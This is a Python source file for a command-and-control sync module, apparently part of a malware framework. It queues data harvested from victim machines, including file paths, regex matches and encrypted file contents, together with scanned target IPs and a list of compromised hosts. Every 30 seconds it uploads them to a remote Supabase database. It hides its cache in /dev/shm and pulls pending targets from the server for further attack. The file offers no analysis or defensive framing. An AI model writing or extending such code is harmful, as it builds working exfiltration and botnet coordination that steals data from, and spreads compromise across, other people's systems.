"""
C2 sync with Supabase, local cache fallback with encryption.
"""
import os
import json
import time
import threading
from datetime import datetime, timezone
from supabase import create_client, Client
from cryptography.fernet import Fernet
from utils.crypto_utils import get_fernet_key
from utils.logging_utils import get_logger
from utils.net_utils import get_local_ip

logger = get_logger(__name__)

class C2Sync:
    TARGET_FIELDS = {'ip', 'ports', 'status', 'discovered_at'}
    FINDING_FIELDS = {'source_ip', 'file_path', 'matched_regex', 'encrypted_content', 'confidence_score', 'timestamp'}
    COMPROMISED_FIELDS = {'ip', 'status', 'timestamp'}

    def __init__(self):
        self.supabase_url = os.getenv('SUPABASE_URL')
        self.supabase_key = os.getenv('SUPABASE_KEY')
        self.batch = []
        self.cache_file = '/dev/shm/.aetheric_cache.json'
        self.fernet = Fernet(get_fernet_key())
        self.lock = threading.Lock()
        self._load_cache()
        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
        self.upload_thread.start()

    def _to_iso_timestamp(self, ts=None):
        if ts is None:
            ts = time.time()
        return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()

    def _load_cache(self):
        if os.path.exists(self.cache_file):
            try:
                with open(self.cache_file, 'rb') as f:
                    encrypted = f.read()
                    data = self.fernet.decrypt(encrypted)
                    self.batch = json.loads(data.decode())
            except Exception:
                self.batch = []

    def _save_cache(self):
        try:
            with open(self.cache_file, 'wb') as f:
                encrypted = self.fernet.encrypt(json.dumps(self.batch).encode())
                f.write(encrypted)
        except Exception:
            pass

    def _upload_loop(self):
        while True:
            time.sleep(30)
            self._flush()

    def _flush(self):
        if not self.batch:
            return
        if self.supabase_url and self.supabase_key:
            try:
                supabase: Client = create_client(self.supabase_url, self.supabase_key)
                for item in self.batch[:]:
                    table = item.get('table')
                    if not table:
                        continue
                    data = item.get('data')
                    if table == 'findings':
                        supabase.table('findings').insert(data).execute()
                    elif table == 'targets':
                        supabase.table('targets').insert(data).execute()
                    elif table == 'compromised_hosts':
                        supabase.table('compromised_hosts').insert(data).execute()
                    with self.lock:
                        self.batch.remove(item)
                self._save_cache()
            except Exception as e:
                logger.error("Upload failed: %s", e)

    def upload_finding(self, finding):
        filtered = {k: v for k, v in finding.items() if k in self.FINDING_FIELDS}
        if 'source_ip' not in filtered:
            filtered['source_ip'] = get_local_ip()
        filtered['timestamp'] = self._to_iso_timestamp()
        item = {'table': 'findings', 'data': filtered}
        with self.lock:
            self.batch.append(item)
            self._save_cache()

    def upload_target(self, target):
        filtered = {k: v for k, v in target.items() if k in self.TARGET_FIELDS}
        if 'ip' not in filtered:
            return
        if 'status' not in filtered:
            filtered['status'] = 'pending'
        filtered['discovered_at'] = self._to_iso_timestamp()
        item = {'table': 'targets', 'data': filtered}
        with self.lock:
            self.batch.append(item)
            self._save_cache()

    def mark_compromised(self, ip):
        data = {'ip': ip, 'status': 'compromised', 'timestamp': self._to_iso_timestamp()}
        filtered = {k: v for k, v in data.items() if k in self.COMPROMISED_FIELDS}
        item = {'table': 'compromised_hosts', 'data': filtered}
        with self.lock:
            self.batch.append(item)
            self._save_cache()

    def get_pending_targets(self):
        if not self.supabase_url or not self.supabase_key:
            return []
        try:
            supabase: Client = create_client(self.supabase_url, self.supabase_key)
            response = supabase.table('targets')\
                .select('ip')\
                .eq('status', 'pending')\
                .execute()
            return [item['ip'] for item in response.data]
        except Exception as e:
            logger.error("Failed to fetch pending targets: %s", e)
            return []
